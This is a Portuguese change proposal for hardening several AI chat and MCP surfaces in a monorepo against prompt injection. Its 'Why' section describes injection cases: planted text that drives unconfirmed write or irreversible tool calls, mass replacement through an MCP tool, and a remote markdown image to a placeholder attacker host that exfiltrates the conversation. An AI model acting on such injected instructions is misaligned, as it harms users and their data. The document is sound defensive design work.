# Proposal

## Why

O levantamento de 2026-10-01 nas superfícies de IA do monorepo achou uma defesa contra prompt injection
desigual. O α (chat do contrate e juiz de conformidade) e a importação de minuta do portal isolam o
conteúdo não confiável com marcador e regra de sistema. As demais superfícies colam texto de terceiros
(dados do banco, planilhas, minutas, documentos enviados) direto no prompt, algumas no próprio system
prompt. Duas delas deixam o modelo escrever sem confirmação humana. Os cenários de maior dano são
concretos:

- **MCP do sisub:** o `apply_template` aceita `conflictMode: "replace"` em intervalo sem teto. A trava
  que o chat do sisub já tem (`agentApplyTemplate`: só `skip`, no máximo 31 datas) não vale aqui. Uma
  receita com instrução embutida pode apagar meses de planejamento numa chamada.
- **Chat dos módulos do sisub:** a confirmação de escrita é só uma frase no prompt. Texto gravado por
  outro usuário (modo de preparo, notas da estimativa, descrição de ARP) induz `remove_menu_item`,
  `update_menu_headcount` ou `update_quantity_estimate_status → completed`, que é irreversível, no
  mesmo turno em que é lido.
- **Contrate:** o markdown da resposta renderiza `<img>` remoto. Um anexo com texto oculto faz o modelo
  escrever `![](https://atacante/?d=…)`, e o navegador vaza a conversa durante o streaming, sem
  clique. O portal e o sisub já fecharam isso.
- **Sucont:** o `oracleContaGenericaFn` usa como system prompt o `systemContext` mandado pelo cliente,
  sem limite de tamanho. O oráculo põe até 60k caracteres de células de planilha dentro do system
  prompt.
- **Extração do α:** o documento entra cru, e o juiz julga o resumo do extrator. Texto oculto no ETP
  (o parser de docx lê até o `w:vanish`) suprime o achado sem chegar ao juiz.

## What Changes

- **Marcador de conteúdo não confiável compartilhado** em `@iefa/ai-provider`: nonce por chamada,
  neutralização de marcador forjado e regra de sistema padrão. Ele generaliza o que o α já faz em
  `compliance/judge-prompt.ts`, e o α passa a usar a versão do pacote.
- **sisub, chat dos módulos:**
  - Toda tool de escrita (`requiredLevel: 2`) passa a exigir **aprovação humana** antes de executar,
    pelo fluxo de aprovação do `@tanstack/ai`. A tela mostra a ação no imperativo e a entidade
    afetada, descrita pelo servidor (nunca UUID cru), com Confirmar e Recusar.
  - O servidor só executa call pendente aprovada de tool que exige aprovação. Edição de argumento na
    aprovação é recusada.
  - Cozinha e unidade ficam presas ao escopo da rota no servidor. A checagem vale para a cozinha ou a
    unidade **resolvida** da linha afetada, não só para o argumento.
  - Os prompts declaram que resultado de ferramenta e dado do banco são dado, nunca instrução.
- **sisub-mcp:**
  - O `apply_template` passa a usar o contrato de agente (`AgentApplyTemplateSchema`, estrito).
    **BREAKING** para clientes MCP: a entrada passa a ser `targetDates` (no máximo 31), e
    `startDate`/`endDate`/`dates`/`conflictMode` são recusados. Substituir cardápio existente fica só
    na tela.
  - O servidor publica `instructions` dizendo que resultado de tool é dado.
- **contrate:** a imagem na resposta do modelo vira o texto alternativo, sem `<img>`, no mesmo padrão
  do portal.
- **portal, chat de comunicações:**
  - O documento atual entra num bloco delimitado com nonce, junto com a regra de dado.
  - A rota passa a descartar mensagem `system`/`developer` vinda do cliente.
- **sucont:**
  - O `oracleContaGenericaFn` passa a montar o system prompt no servidor. O contexto do cliente vira um
    bloco de dado delimitado, com teto, e a `query` também ganha teto.
  - O oráculo delimita o `contextSummary` e descarta mensagem `system`/`developer` do cliente.
  - O `adaptDraftFn` ganha system prompt próprio, e o rascunho vai delimitado e com teto.
  - A nota analítica do auditor e a análise SAC-DGC delimitam os dados de planilha.
- **α:**
  - A extração isola o documento com o marcador compartilhado e a regra de dado.
  - O texto das submissões deixa de incluir texto oculto do DOCX (`w:vanish`), que o revisor não vê
    no Word.
- **Catálogo de edge cases:** entram a aprovação pendente perdida e a aprovação dada depois que o dado
  mudou.

## Capabilities

### New Capabilities

- `ai-untrusted-content`: como conteúdo que não é instrução do sistema (documento, planilha, dado do
  banco, contexto montado no navegador) entra no prompt, e como a saída do modelo é exibida sem buscar
  recurso remoto sozinha.
- `ai-agent-actions`: o que um agente de IA pode fazer com efeito: aprovação humana antes de escrever,
  escopo amarrado à rota ou sessão, e o contrato que limita as tools de efeito em massa no chat e no
  MCP.

### Modified Capabilities

Nenhuma. Não existe spec de IA em `openspec/specs/`.

## Impact

- **Apps:** `sisub` (chat dos módulos: rota, tools, prompts, tela do chat), `sisub-mcp`, `contrate`,
  `portal`, `sucont`, `alpha`.
- **Packages:**
  - `ai-provider`: módulo novo de conteúdo não confiável e filtro de papel do cliente.
  - `sisub-domain`: texto da regra de dado em `agent/`, status `denied` no schema da mensagem de chat
    (jsonb, sem migration).
- **APIs:**
  - O `apply_template` do MCP muda de entrada (ver acima).
  - O `oracleContaGenericaFn` troca `systemContext` por um campo de contexto com teto. O único chamador
    é a tela do próprio sucont, que muda junto.
- **Sem migration, sem infra, sem segredo.** Nada aqui espera o mantenedor pela política de PR.

## Não-objetivos

Ficam para changes próprios, porque cada um exige o mantenedor pela política de PR ou tem desenho
próprio:

- **Bedrock Guardrails** (`aws_bedrock_guardrail` em `infra/**` + `guardrailConfig` no adapter):
  depende de infra.
- **Regras opengrep sobre IA** (markdown com `<img>`, escopo vindo de argumento de tool): `.opengrep/`
  é gate.
- **Evals adversariais no CI:** `.github/**` é gate.
- **Observabilidade:** log das chamadas de tool, autor nas escritas, invocation logging do Bedrock.
- **LGPD:** atualizar o `LGPD.md` (perfil `global.`, reserva Groq/NVIDIA) e o tracing do LangSmith
  ligado por padrão no α com a chave presente no repositório. É texto de política e variável de
  produção.
- **Confirmação no chat do portal:** as tools só editam o documento local e têm "desfazer". Fica para
  depois.
- **Allowlist de links** na saída do modelo, em todos os apps.
- **Redesenho do orçamento de tokens** (teto diário por processo, contado depois do turno).
- **α:** `CONFORME` sem guarda, sessão do ChatRADA sem dono até o primeiro turno, delimitação dos
  trechos de norma.
- **sisub-mcp:** chave de API com escopo só de leitura.
- **sisub analytics:** recorte de PII.
